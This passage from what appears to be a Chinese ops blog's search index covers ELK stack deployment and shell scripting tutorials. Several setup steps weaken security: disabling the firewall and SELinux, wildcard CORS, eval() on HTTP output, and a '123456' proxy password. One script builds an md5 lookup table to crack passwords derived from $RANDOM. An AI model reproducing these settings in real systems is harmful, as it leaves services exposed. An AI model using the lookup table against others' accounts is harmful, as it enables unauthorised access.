索引 1首先访问elasticsearch-head, 查看索引名称或者通过定义的logstash日志收集规则配置文件查看索引名称 1访问kibana, Management -- Index Patterns -- 添加索引(如下图) kibana展示 总结 121. logstash收集谁的日志，就把logstash安装在哪台机器上，之间使用file模块指定在input即可。2. logstash语法大多数为重复性的，记住常用的几个模块和if判断规则即可。特殊使用的话就去官网查找用法。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"kibana","slug":"kibana","permalink":"https://garywu520.github.io/tags/kibana/"},{"name":"Logstash","slug":"Logstash","permalink":"https://garywu520.github.io/tags/Logstash/"}]},{"title":"ELK日志分析平台部署","slug":"ELK日志分析平台部署","date":"2017-12-10T01:40:22.000Z","updated":"2019-04-11T09:37:13.267Z","comments":true,"path":"2017/12/10/ELK日志分析平台部署/","link":"","permalink":"https://garywu520.github.io/2017/12/10/ELK%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E9%83%A8%E7%BD%B2/","excerpt":"什么是ELK？123ELK 是由Elasticsearch、Logstash、Kibana 三个开源软件的组成的一个组合体。官方网站: https:&#x2F;&#x2F;www.elastic.co&#x2F;","text":"什么是ELK？123ELK 是由Elasticsearch、Logstash、Kibana 三个开源软件的组成的一个组合体。官方网站: https:&#x2F;&#x2F;www.elastic.co&#x2F; 12345Elasticsearch 是一个高度可扩展的开源全文搜索和分析引擎，它可实现数据的实时全文搜索、支持分布式可实现高可用、提供API 接口，可以处理大规模日志数据，比如Nginx、Tomcat、系统日志等功能。Logstash 可以通过插件实现日志收集和转发，支持日志过滤，支持普通log、自定义json格式的日志解析。kibana：主要是通过接口调用elasticsearch 的数据，并进行前端数据可视化的展现。 部署Elasticsearch集群部署 环境初始化 1234567891011121314151617181. 为保证效果特额外添加一块单独的数据磁盘大小为50G 并格式化挂载到&#x2F;elk mkdir &#x2F;elk &amp;&amp; mkfs.ext4 &#x2F;dev&#x2F;sdb blkid &#x2F;dev&#x2F;sdb 2. 关闭防所有服务器的火墙和selinux。是为了避免出现各种未知问题3. 修改limit限制 echo &quot;* soft nofile 65536&quot; &gt;&gt; &#x2F;etc&#x2F;security&#x2F;limits.conf echo &quot;* hard nofile 65536&quot; &gt;&gt; &#x2F;etc&#x2F;security&#x2F;limits.conf4. 各服务器配置本地域名解析 10.0.10.21 host21.exmaple.com 10.0.10.22 host22.exmaple.com 10.0.10.23 host23.exmaple.com5. 设置epel源、安装基本操作命令并同步时间 wget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;epel.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;epel-7.repo cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime echo &quot;*&#x2F;5 * * * * ntpdate -u time1.aliyun.com &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 &quot; &gt;&gt;&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 重启系统，没有问题的话给虚拟机做快照以方便后期还原 安装Elasticsearch 安装java环境 12http:&#x2F;&#x2F;www.oracle.com&#x2F;technetwork&#x2F;java&#x2F;javase&#x2F;downloads&#x2F;jdk8-downloads-2133151.html接受协议并下载&quot;jdk-8u151-linux-x64.tar.gz&quot; 12345678910111213141516171819tar xvf jdk-8u121-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;ln -sv &#x2F;usr&#x2F;local&#x2F;jdk1.8.0_121 &#x2F;usr&#x2F;local&#x2F;jdkcat &gt;&gt; &#x2F;etc&#x2F;profile &lt;&lt;EOFexport HISTTIMEFORMAT&#x3D;&quot;%F %T &#96;whoami&#96; &quot; export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdkexport CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;rt.jar:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jarexport PATH&#x3D;$PATH:$JAVA_HOME&#x2F;binEOF注：export HISTTIMEFORMAT&#x3D;&quot;%F %T &#96;whoami&#96; &quot; 是给history加上时间戳source &#x2F;etc&#x2F;profile[root@linux~]# java -versionjava version &quot;1.8.0_121&quot; #确认可以出现当前的java 版本号Java(TM) SE Runtime Environment (build 1.8.0_121-b13)Java HotSpot(TM) 64-Bit Server VM (build 25.121-b13, mixed mode) 安装Elasticsearch 123目前稳定版本为5.6.5,建议使用此版本用于生产环境wget https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;downloads&#x2F;elasticsearch&#x2F;elasticsearch-5.6.5.rpmyum install -y elasticsearch-5.6.5.rpm 编辑各elasticsearch服务器节点的配置文件 123456789[root@linux-host1 ~]# grep &quot;^[a-Z]&quot; &#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.ymlcluster.name: ELK-Cluster #ELK集群名称，名称相同即属于是同一个集群node.name: elk-node1 #本机在集群内的节点名称,其他为elk-node2、elk-node3...path.data: &#x2F;elk&#x2F;data #数据保存目录path.logs: &#x2F;elk&#x2F;logs #日志保存目bootstrap.memory_lock: true #服务启动的时候锁定足够的内存，防止数据写入swapnetwork.host: 0.0.0.0 #监听IPhttp.port: 9200discovery.zen.ping.unicast.hosts: [&quot;10.0.10.21&quot;, &quot;10.0.10.22&quot;, &quot;10.0.10.23&quot;] 修改各节点内存限制 12345678910111213修改elasticsearch的启动文件脚本vim &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;elasticsearch.service搜索“LimitNOFILE&#x3D;65536” 在这个位置，添加如下参数：LimitMEMLOCK&#x3D;infinity ##此参数,可以最大化使用内存[root@host21 ~]# grep &quot;^[-]&quot; &#x2F;etc&#x2F;elasticsearch&#x2F;jvm.options #修改最小和最大内存-Xms4g-Xmx4g注：此处内存设置不能等于物理内存，否则进程启动后会立即自杀注：官方建议此处最大内存配置为30G ；为什么最大和最小内存配置为一样大？参考官方说明：https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;elasticsearch&#x2F;reference&#x2F;current&#x2F;heap-size.html 目录权限更改 12345修改各节点中用于存放elasticsearch数据和日志目录的权限为elasticsearchid elasticsearchmkdir -p &#x2F;elk&#x2F;&#123;data,logs&#125;chown -R elasticsearch:elasticsearch &#x2F;elkll &#x2F;elk 启动各节点elasticsearch服务并验证 123456systemctl start elasticsearchsystemctl status elasticsearchsystemctl enable elasticsearch[root@host23 ~]# ss -lntup |grep 9200tcp LISTEN 0 128 :::9200 :::* users:((&quot;java&quot;,pid&#x3D;19034,fd&#x3D;223)) 通过浏览器访问各节点的elasticsearch服务端口 123http:&#x2F;&#x2F;10.0.10.21:9200http:&#x2F;&#x2F;10.0.10.22:9200http:&#x2F;&#x2F;10.0.10.23:9200 123456789101112131415访问http:&#x2F;&#x2F;10.0.10.21:9200结果如下：&#123; &quot;name&quot; : &quot;elk-node1&quot;, #本节点名称 &quot;cluster_name&quot; : &quot;ELK-Cluster&quot;, #集群名称 &quot;cluster_uuid&quot; : &quot;8GbwHyOFRQ-FtF785a0HPQ&quot;, &quot;version&quot; : &#123; &quot;number&quot; : &quot;5.6.5&quot;, #elasticsearch版本号 &quot;build_hash&quot; : &quot;6a37571&quot;, &quot;build_date&quot; : &quot;2017-12-04T07:50:10.466Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;6.6.1&quot; #lucene版本号,elasticsearch基于Lucene做搜索 &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot; #口号&#125; 安装elasticsearch插件之head(其中一个节点安装即可) 安装es5.x版本的elasticsearch-head插件 1234567891011在elasticsearch 5.x 版本以后不再支持直接安装head 插件，而是需要通过启动npm方式安装git地址：https:&#x2F;&#x2F;github.com&#x2F;mobz&#x2F;elasticsearch-headyum install -y npmcd &#x2F;usr&#x2F;local&#x2F;src&#x2F; &amp;&amp; git clone git:&#x2F;&#x2F;github.com&#x2F;mobz&#x2F;elasticsearch-head.gitcd elasticsearch-head&#x2F; &amp;&amp; yum install -y openssl openssl-develnpm install grunt -savell node_modules&#x2F;grunt #确认生成文件npm install #执行安装npm run start &amp; #后台启动服务 修改各节点elasticsearch服务配置文件【每个es节点都要修改】 1234567开启跨域访问支持，然后重启elasticsearch 服务：vim &#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.yml #最下方添加以下两行http.cors.enabled: true http.cors.allow-origin: &quot;*&quot;systemctl restart elasticsearch web访问elasticsearch-head 1http:&#x2F;&#x2F;10.0.10.21:9100 测试提交数据 验证索引是否存在 查看数据 Master与Slave的区别 12Master 的职责：统计各node节点状态信息、集群状态信息统计、索引的创建和删除、索引分配的管理、关闭node节点等Slave 的职责：同步数据、等待机会成为Master elasticsearch 插件之kopf 123Git项目地址: https:&#x2F;&#x2F;github.com&#x2F;lmenezes&#x2F;elasticsearch-kopf但是目前还不支持5.x版本的elasticsearch，但是可以安装在elasticsearc 1.x 或2.x 的版本安装。 elasticsearch集群监控 123456789101112131415161718192021[root@host21 ~]# curl -sXGET http:&#x2F;&#x2F;10.0.10.21:9200&#x2F;_cluster&#x2F;health?pretty&#x3D;true&#123; &quot;cluster_name&quot; : &quot;ELK-Cluster&quot;, &quot;status&quot; : &quot;green&quot;, &quot;timed_out&quot; : false, &quot;number_of_nodes&quot; : 3, &quot;number_of_data_nodes&quot; : 3, &quot;active_primary_shards&quot; : 5, &quot;active_shards&quot; : 10, &quot;relocating_shards&quot; : 0, &quot;initializing_shards&quot; : 0, &quot;unassigned_shards&quot; : 0, &quot;delayed_unassigned_shards&quot; : 0, &quot;number_of_pending_tasks&quot; : 0, &quot;number_of_in_flight_fetch&quot; : 0, &quot;task_max_waiting_in_queue_millis&quot; : 0, &quot;active_shards_percent_as_number&quot; : 100.0&#125;#获取到的是一个json 格式的返回值，那就可以通过python对其中的信息进行分析，例如对status进行分析，如果等于green(绿色)就是运行在正常，等于yellow(黄色)表示副本分片丢失，red(红色)表示主分片丢失 python检测脚本 123456789101112131415161718[root@linux ~]# cat els-cluster-monitor.py#!&#x2F;usr&#x2F;bin&#x2F;env python#coding:utf-8#Author Zhang Jieimport smtplibfrom email.mime.text import MIMETextfrom email.utils import formataddrimport subprocessbody &#x3D; &quot;&quot;false&#x3D;&quot;false&quot;obj &#x3D; subprocess.Popen((&quot;curl -sXGET http:&#x2F;&#x2F;10.0.10.21:9200&#x2F;_cluster&#x2F;healthpretty&#x3D;true&quot;),shell&#x3D;True,stdout&#x3D;subprocess.PIPE)data &#x3D; obj.stdout.read()data1 &#x3D; eval(data)status &#x3D; data1.get(&quot;status&quot;)if status &#x3D;&#x3D; &quot;green&quot;:print &quot;50&quot;else:print &quot;100&quot; 123脚本执行结果：[root@linux-host1 ~]# python els-cluster-monitor.py50 排错 1如果服务无法启动或启动立即停止，查看&#x2F;var&#x2F;log&#x2F;message最新日志或ELK的logs目录 部署Logstash12345Logstash 是一个开源的数据收集引擎，可以水平伸缩，而且logstash 整个ELK当中拥有最多插件的一个组件，其可以接收来自不同来源的数据并统一输出到指定的且可以是多个不同目的地。注：生产环境Logstash尽量与elasticsearch服务器分开，因为都是java程序，太浪费内存 logstash工作流程图 环境准备 1234567891011121314服务器：10.0.10.2410.0.10.25关闭防火墙和selinux更新时间：cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtimentpdate -u ntp1.aliyun.comsystemctl stop firewalldsystemctl disable firewalldsed -i &#39;&#x2F;SELINUX&#x2F;s&#x2F;enforcing&#x2F;disabled&#x2F;&#39; &#x2F;etc&#x2F;selinux&#x2F;config安装java 环境: 同es初始化java安装 安装logstash 12345官网：https:&#x2F;&#x2F;www.elastic.co&#x2F;downloads&#x2F;past-releases&#x2F;logstash-5-6-5同样是下载5.6.5版本wget https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;downloads&#x2F;logstash&#x2F;logstash-5.6.5.rpmyum install -y logstash-5.6.5.rpm 123456789#启动systemctl start logstashsystemctl status logstashsystemctl enable logstash注：rpm包方式安装，如果启动失败(提示无启动文件),依次执行如下命令rpm -e logstashrpm -ivh logstash-5.4.1.rpmsystemctl start logstash Logstash测试语法 12logstash -f &#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;systemlog.conf -tConfiguration OK 测试logstash 测试标准输入 1234567891011[root@localhost ~]# logstash -e &#39;input &#123; stdin&#123;&#125; &#125;output &#123; stdout&#123; codec &#x3D;&gt; rubydebug &#125;&#125;&#39;Hello Logstash ! #标准输入和输出&#123; &quot;@version&quot; &#x3D;&gt; &quot;1&quot;, #事件版本号，一个事件就是一个ruby对象 &quot;host&quot; &#x3D;&gt; &quot;localhost.localdomain&quot;, #标记事件发生在哪里 &quot;@timestamp&quot; &#x3D;&gt; 2017-12-12T10:05:13.600Z, #当前事件的发生时间 &quot;message&quot; &#x3D;&gt; &quot;Hello Logstash !&quot; #消息的具体内容（就是我刚才输入的）&#125; 测试输出到文件 1logstash -e &#39;input &#123; stdin&#123;&#125; &#125; output &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;tmp&#x2F;log-%&#123;+YYYY.MM.dd&#125;messages.gz&quot;&#125;&#125;&#39; 12[root@localhost ~]# tailf &#x2F;tmp&#x2F;log-2017.12.12messages.gz #打开文件验证&#123;&quot;@version&quot;:&quot;1&quot;,&quot;host&quot;:&quot;localhost.localdomain&quot;,&quot;@timestamp&quot;:&quot;2017-12-12T10:12:17.087Z&quot;,&quot;message&quot;:&quot;Test&quot;&#125; 测试输出到elasticsearch 1logstash -e &#39;input &#123; stdin&#123;&#125; &#125; output &#123; elasticsearch &#123;hosts &#x3D;&gt; [&quot;10.0.10.21:9200&quot;] index &#x3D;&gt;&quot;mytest-%&#123;+YYYY.MM.dd&#125;&quot; &#125;&#125;&#39; 12345elasticsearch 服务器验证收到数据：[root@host21 ~]# ll &#x2F;elk&#x2F;data&#x2F;nodes&#x2F;0&#x2F;indices&#x2F;total 8drwxr-xr-x 6 elasticsearch elasticsearch 4096 Dec 12 05:18 thwe1ENcR-ed2zZe7FncDAdrwxr-xr-x 6 elasticsearch elasticsearch 4096 Dec 11 08:00 _x7SPg0MSdCC-sDJ43gRVQ 部署kibana1kibana：主要是通过接口调用elasticsearch 的数据，并进行前端数据可视化的展现。 安装kibana到10.0.10.21服务器 123官方下载：wget https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;downloads&#x2F;kibana&#x2F;kibana-5.6.5-x86_64.rpmyum install -y kibana-5.6.5-x86_64.rpm 配置kibana 1234[root@host21 ~]# grep -n &quot;^[a-Z]&quot; &#x2F;etc&#x2F;kibana&#x2F;kibana.ymlserver.port: 5601 #监听端口server.host: &quot;0.0.0.0&quot; #监听地址elasticsearch.url: http:&#x2F;&#x2F;192.168.56.11:9200 #elasticsearch服务器地址 启动kibana服务 12345systemctl start kibanasystemctl status kibanasystemctl enable kibana[root@host21 ~]# ss -lntup |grep 5601tcp LISTEN 0 128 *:5601 *:* users:((&quot;node&quot;,pid&#x3D;3158,fd&#x3D;11)) 验证 1http:&#x2F;&#x2F;10.0.10.21:5601 kibana新建索引 1访问elasticsearch-head插件：http:&#x2F;&#x2F;10.0.10.21:9100，查看elasticsearch已有的日志 1然后，登陆kibana -- Management -- Index Patterns 由于日志并没有持续输出，所以此处显示为空，接下来将对logstash日志输出做详细说明，基本部署完成。 nginx反向代理kibana 安全部署说明 123通过nginx和kibana监听127.0.0.1以及在kibana客户端绑定hosts来实现安全测试环境：10.0.10.21服务器 12yum install gcc gcc++ pcre openssl openssl-devel zlib zlib-devel pcre-devel.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --with-http_sub_module --with-http_ssl_module &amp;&amp; make &amp;&amp; make install 配置nginx代理kibana 123456789101112131415161718192021222324252627282930313233vim &#x2F;etc&#x2F;kibana&#x2F;kibana.ymlserver.host: &quot;127.0.0.1&quot; #只监听127.0.0.1systemctl restart kibanamkdir &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;conf.d&#x2F;nginx配置文件添加一行：include &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;conf.d&#x2F;*.conf;vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;conf.d&#x2F;kibana5612.conf #添加如下配置upstream kibana_server &#123; server 127.0.0.1:5601 weight&#x3D;1 max_fails&#x3D;3 fail_timeout&#x3D;60;&#125;server &#123; listen 80; server_name www.kibana1021.com; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;kibana_server; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; &#125;&#125;启动Nginx&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx 12yum install -y httpd-toolshtpasswd -bc htpasswd.txt garywu 123456 #文件路径需在&#x2F;usr&#x2F;local&#x2F;nginx下 修改nginx kibana配置 12345678910111213141516171819upstream kibana_server &#123; #nginx也改为127.0.0.1 server 127.0.0.1:5601 weight&#x3D;1 max_fails&#x3D;3 fail_timeout&#x3D;60; &#125;server &#123; listen 80; server_name www.kibana1021.com; auth_basic &quot;Restricted Access&quot;; auth_basic_user_file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htpasswd.txt; #文件名千万别错了 location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;kibana_server; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; &#125;&#125; 1234windows添加本地解析： 10.0.10.21 www.kibana5612.com重启kibana和nginxweb访问：http:&#x2F;&#x2F;www.kibana1021.com&#x2F; 出现账号密码界面了","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"kibana","slug":"kibana","permalink":"https://garywu520.github.io/tags/kibana/"},{"name":"logstash","slug":"logstash","permalink":"https://garywu520.github.io/tags/logstash/"},{"name":"kopf","slug":"kopf","permalink":"https://garywu520.github.io/tags/kopf/"},{"name":"ELK安全设置","slug":"ELK安全设置","permalink":"https://garywu520.github.io/tags/ELK%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"elasticsearch集群监控","slug":"elasticsearch集群监控","permalink":"https://garywu520.github.io/tags/elasticsearch%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7/"}]},{"title":"shell高级编程-进阶3","slug":"shell高级编程-进阶3","date":"2017-12-09T01:37:27.000Z","updated":"2017-12-09T11:42:53.838Z","comments":true,"path":"2017/12/09/shell高级编程-进阶3/","link":"","permalink":"https://garywu520.github.io/2017/12/09/shell%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B-%E8%BF%9B%E9%98%B63/","excerpt":"case条件语句 如果$x等于”值1”则执行命令1…以此类推 123456789101112131415case $x in 值1) 命令1 ;; 值2) 命令2 ;; ... *) 命令n ;; esac 使用场景：系统服务的启动脚本或菜单脚本一般使用case语句","text":"case条件语句 如果$x等于”值1”则执行命令1…以此类推 123456789101112131415case $x in 值1) 命令1 ;; 值2) 命令2 ;; ... *) 命令n ;; esac 使用场景：系统服务的启动脚本或菜单脚本一般使用case语句 case语句 12345678910111213141516171819202122232425262728293031脚本：[root@linux-node1 ~]# cat menu.sh #!&#x2F;bin&#x2F;bashcat&lt;&lt;EOF------------------------- 1.apple 2.pear 3.banana 4.exit-------------------------EOFread -p &quot;请输入一种水果名称：&quot; numcase $num in 1) echo -e &quot;\\033[31m Hi,李雷.This is Apple! \\033[0m&quot; ;; 2) echo -e &quot;\\033[32m Hi,李雷.This is Pear! \\033[0m&quot; ;; 3) echo -e &quot;\\033[33m Hi,李雷.This is banana! \\033[0m&quot; ;; *) echo -e &quot;\\033[41;37m Error,输入错误,请重新输入\\033[0m&quot; ;;esac rsync服务简单启动服务脚本 12345678910111213141516171819202122232425[root@linux-node1 ~]# cat rsync #判断配置文件与命令文件是否存在,否则就退出#!&#x2F;bin&#x2F;bash[ -f &#x2F;etc&#x2F;rsync&#x2F;rsyncd.conf ] || exit [ -f &#x2F;usr&#x2F;sbin&#x2F;rsync ] || exitcase $1 in start) rsync --daemon ;; stop) pkill rsync ;; reload) pkill rsync sleep 2 rsync --daemon ;; *) echo &quot;USAGE: sh $0 start|stop|reload&quot; ;; esac for循环语句 语法: 123456for 变量 in 变量取值列表 do 命令1 ....done 123for i in &#96;ls&#96; ;do echo $i;donefor n in &#96;seq 5 -1 1&#96;;do echo $n;done 使用for循环,批量创建10个文件，要求:文件名包含10个随机字符并以_oldboy.html结尾 12345678910111213[root@oldboyedu scripts]# cat 19-1.sh #!&#x2F;bin&#x2F;bashdir&#x3D;&#x2F;oldboy[ ! -d $dir ] &amp;&amp; mkdir -p $dircd $dir &amp;&amp; \\for i in &#123;1..10&#125; do ranStr&#x3D;&#96;uuidgen|tr &#39;0-9-&#39; &#39;a-z&#39;|cut -c -10&#96; touch $&#123;ranStr&#125;_oldboy.htmldone 批量修改上一个练习中的文件名，要求: 修改oldboy为oldgirl并修改.html为.HTML 12345678910#!&#x2F;bin&#x2F;bashdir&#x3D;&#x2F;oldboycd $dir \\for i in &#96;ls&#96; do str&#x3D;&#96;echo $i|cut -c -10&#96; mv $i $&#123;str&#125;_oldgirl.HTMLdone 批量创建10个oldboy为前缀的用户并为用户创建随机密码 123456789101112131415#!&#x2F;bin&#x2F;bashfor user in oldboy&#123;01..10&#125;do id $user if [ ! $? -eq 0 ];then useradd $user pass&#x3D;&#96;echo $RANDOM|md5sum|cut -c -5&#96; echo &quot;$pass&quot; |passwd --stdin $user &gt;&gt;&#x2F;dev&#x2F;null echo &quot;用户账号: &quot; $user ,&quot;用户密码: &quot; $pass &gt;&#x2F;root&#x2F;users.txt else echo &quot;用户已存在&quot; fidone 做一个监控内网主机存活的脚本(串行脚本,耗费时间较长) 1234567891011121314[root@linux-node1 ~]# cat alive.sh #!&#x2F;bin&#x2F;bash. &#x2F;etc&#x2F;init.d&#x2F;functions &#x2F;&#x2F;与下方的action ... &#x2F;bin&#x2F;true配合使用for i in 192.168.56.&#123;1..254&#125; do ping -c 1 -W 1 $i &amp;&gt;&#x2F;dev&#x2F;null if [ $? -eq 0 ];then action &quot;$i&quot; &#x2F;bin&#x2F;true fi done 123456789101112后台运行程序ping -c 1 -W 1 $i &amp;&gt;&#x2F;dev&#x2F;null &amp;管理后台程序命令jobs输出结果如下：[1]+ Terminated ping 192.168.56.253 &amp;&gt;&#x2F;dev&#x2F;null杀死后台进程kill %1 kill %2kill %n 要求：筛选不大于6个数的单词 123456#!&#x2F;bin&#x2F;bashfor i in I am oldboy teacher welcome to oldboy trainingclass do [ $&#123;#i&#125; -le 6 ] &amp;&amp; echo $idone 破解RANDOM随机数 123456789101112131415通过man bash 搜索“RANDOM”可以看到RANDOM结果的范围,即0-32767[root@linux-node1 ~]# cat pass.sh #!&#x2F;bin&#x2F;bashdbFile&#x3D;&#x2F;tmp&#x2F;password.txtfor i in &#123;0..32767&#125;do screct&#x3D;&#96;echo $i|md5sum&#96; echo &quot;$i $screct&quot; &gt;&gt; $dbFile done注意: 输出到文档后，需要使用追加！ 1234567执行结果：[root@linux-node1 ~]# egrep &#39;21029299|00205d1c|a3da1677|1f6d12dd|890684b&#39; &#x2F;tmp&#x2F;password.txt 1346 00205d1cbbeb97738ad5bbdde2a6793d -7041 1f6d12dd61b5c7523f038a7b966413d9 -10082 890684ba3685395c782547daf296935f -25345 a3da1677501d9e4700ed867c5f33538a -25667 2102929901ee1aa769d0f479d7d78b05 - 输出乘法口诀 12345678for a in &#96;seq 9&#96; do for b in &#96;seq 9&#96; do [ $a -ge $b ] &amp;&amp; echo -en &quot;$a x $b &#x3D; $(expr $a \\* $b) &quot; doneecho &quot; &quot;done while循环语句 123条件一旦成立则永远进行死循环使用场景：一般用于守护进程(不停止的进程) 123456语法：while 条件 do 执行的命令 sleep 30done 水果菜单-while循环-修改版 12345678910111213141516171819202122232425262728293031323334[root@linux-node1 ~]# cat menu.sh #!&#x2F;bin&#x2F;bashcat&lt;&lt;EOF-------------------------1.apple2.pear3.banana4.exit-------------------------EOFwhile truedo read -p &quot;请输入一种水果名称：&quot; num case $num in 1) echo -e &quot;\\033[31m Hi,李雷.This is Apple! \\033[0m&quot; ;; 2) echo -e &quot;\\033[32m Hi,李雷.This is Pear! \\033[0m&quot; ;; 3) echo -e &quot;\\033[33m Hi,李雷.This is banana! \\033[0m&quot; ;; *) echo -e &quot;\\033[41;37m Error,输入错误,请重新输入\\033[0m&quot; exit ;; esacdone 123456789101112131415161718执行效果：[root@linux-node1 ~]# sh menu.sh -------------------------1.apple2.pear3.banana4.exit-------------------------请输入一种水果名称：1 Hi,李雷.This is Apple! 请输入一种水果名称：2 Hi,李雷.This is Pear! 请输入一种水果名称：3 Hi,李雷.This is banana! 请输入一种水果名称：4 Error,输入错误,请重新输入[root@linux-node1 ~]# 12sleep 1 &#x2F;&#x2F;1秒usleep 10000 &#x2F;&#x2F;10000微秒 123456789vim &#x2F;etc&#x2F;while1.shi&#x3D;0while [ $i -lt 4 ] do uptime sleep 1 ((i++))done shell脚本限制DDos攻击 123456789101112131415161718191.防止服务器被DDoS攻击的Shell脚本 mkdir &#x2F;root&#x2F;bin vi &#x2F;root&#x2F;bin&#x2F;dropip.sh #!&#x2F;bin&#x2F;bash &#x2F;bin&#x2F;netstat -na|grep ESTABLISHED|awk &#39;&#123;print $5&#125;&#39;|awk -F: &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -rn|head -10|grep -v -E &#39;192.168|127.0&#39;|awk &#39;&#123;if ($2!&#x3D;null &amp;&amp; $1&gt;4) &#123;print $2&#125;&#125;&#39;&gt;&#x2F;tmp&#x2F;dropip for i in $(cat &#x2F;tmp&#x2F;dropip) do &#x2F;sbin&#x2F;iptables -A INPUT -s $i -j DROP echo “$i kill at &#96;date&#96;”&gt;&gt;&#x2F;var&#x2F;log&#x2F;ddos Done 脚本说明;在这段脚本中，最重要的是第二行：意思为获取ESTABLISHED连接数最多的前10个ip并写入临时文件&#x2F;tmp&#x2F;dropip,排除了内部ip段192.168|127.0开头的.通过for循环将dropip里面的ip通过iptables全部drop掉，然后写到日志文件&#x2F;var&#x2F;log&#x2F;ddos 2.增加执行权限 chmod +x &#x2F;root&#x2F;bin&#x2F;dropip.sh 3.添加到计划任务，每分钟执行一次 crontab -e *&#x2F;1 * * * * &#x2F;root&#x2F;bin&#x2F;dropip.sh 使用while循环从文件一行一行读入 1234567#!&#x2F;bin&#x2F;bashn&#x3D;1while read i do echo &quot;第$no行: &quot; $i ((no++))done &lt; &#x2F;etc&#x2F;hosts 30个shell生产环境面试题 1http:&#x2F;&#x2F;blog.51cto.com&#x2F;oldboy&#x2F;1867160s exit n 12345while true do exitdone作用：一旦条件满足,则脚本立即退出；其中exit中的n，意思是定义退出返回值 break n 12作用：一旦条件满足，则跳出循环(注：if是判断不是循环)，但会继续执行循环之外的内容其中n是指退出几层循环 continue n 12作用：一旦条件满足，则结束当前本次循环,继续下一次循环其中n是指退出几层循环 reture n 1作用：只在函数中起作用,用来判断函数执行是否正确。和exit一样。 shell数组 注：数组是保存到内存中的,由于性能差劲，了解即可 1234567891011121314151617arry&#x3D;(1 2 3) 定义数组,将1、2、3同时赋值给变量array如：[root@linux-node1 ~]# arry&#x3D;(1 2 3)[root@linux-node1 ~]# echo $&#123;arry[@]&#125; #查看数组所有内容1 2 3[root@linux-node1 ~]# [root@linux-node1 ~]# echo $&#123;arry[0]&#125; #查看第0个值（从0开始）1[root@linux-node1 ~]# echo $&#123;arry[1]&#125; #查看第1个值2[root@linux-node1 ~]# echo $&#123;arry[2]&#125; #查看第2个值3[root@linux-node1 ~]# 获取数组长度 1234[root@linux-node1 ~]# echo $&#123;#arry[0]&#125;1[root@linux-node1 ~]# echo $&#123;#arry[1]&#125;1 数组赋值 12345[root@linux-node1 ~]# arry[3]&#x3D;4[root@linux-node1 ~]# echo $&#123;arry[3]&#125;4[root@linux-node1 ~]# echo $&#123;arry[@]&#125;1 2 3 4 遍历数组 12345[root@linux-node1 ~]# for i in $&#123;arry[@]&#125;;do echo $i;done1234 shell函数12作用：把脚本里面多次调用相同的代码定义成一份，起个名字，需要的时候直接调用即可。优势：把相同的程序段定义成函数，减少程序代码量、易读 1234567891011121314151617[root@linux-node1 ~]# cat fun.sh #!&#x2F;bin&#x2F;bash#定义函数名：sendmailsendmail()&#123; echo &quot;Hello World&quot; return 3&#125;#调用函数sendmail[root@linux-node1 ~]# [root@linux-node1 ~]# sh fun.sh Hello World 1234567source下函数脚本之后，函数名称(sendmail)可以通过Tab键补全[root@linux-node1 ~]# source fun.sh Hello World [root@linux-node1 ~]# sendmail #按两次Tab,sendmail就是刚才定义的函数sendmail sendmail.postfix [root@linux-node1 ~]# sendmail 12345678910[root@linux-node1 ~]# cat fun.sh #!&#x2F;bin&#x2F;bashsendmail()&#123; echo &quot;Hello World&quot; return 3&#125;sendmailecho $? 函数传参 